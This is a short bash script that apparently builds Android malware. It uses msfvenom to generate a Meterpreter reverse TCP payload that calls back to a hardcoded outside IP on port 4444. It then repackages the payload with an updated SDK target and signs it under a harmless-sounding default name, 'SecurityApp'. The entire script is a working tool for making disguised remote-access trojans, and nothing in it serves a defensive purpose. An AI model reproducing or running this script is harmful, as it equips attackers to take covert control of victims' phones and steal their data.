#!/bin/bash
# Quick APK Builder with SDK 30 Support
# Usage: ./quick_apk_builder.sh <name>

NAME="${1:-SecurityApp}"
LHOST="208.77.244.15"
LPORT="4444"

echo "Building: $NAME with SDK 30..."

# Generate
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "${NAME}_tmp.apk" >/dev/null 2>&1

# Decompile
apktool d "${NAME}_tmp.apk" -o "${NAME}_dec" -f >/dev/null 2>&1

# Update SDK
sed -i 's/minSdkVersion="[0-9]*"/minSdkVersion="24"/' "${NAME}_dec/AndroidManifest.xml"
sed -i 's/targetSdkVersion="[0-9]*"/targetSdkVersion="30"/' "${NAME}_dec/AndroidManifest.xml"

# Rebuild
apktool b "${NAME}_dec" -o "${NAME}_reb.apk" >/dev/null 2>&1

# Zipalign
zipalign -f 4 "${NAME}_reb.apk" "${NAME}_ali.apk" 2>/dev/null

# Sign
apksigner sign \
  --ks android-release.keystore \
  --ks-key-alias androidkey \
  --ks-pass pass:android123 \
  --key-pass pass:android123 \
  --out "${NAME}.apk" \
  "${NAME}_ali.apk" 2>/dev/null

# Cleanup
rm -rf "${NAME}_dec" "${NAME}_tmp.apk" "${NAME}_reb.apk" "${NAME}_ali.apk"

if [ -f "${NAME}.apk" ]; then
    echo "✅ ${NAME}.apk ($(du -h ${NAME}.apk | cut -f1))"
    apksigner verify "${NAME}.apk" 2>&1 | grep -q "Verifies" && echo "   ✓ Signature valid" || echo "   ✗ Signature invalid"
else
    echo "❌ Build failed"
fi
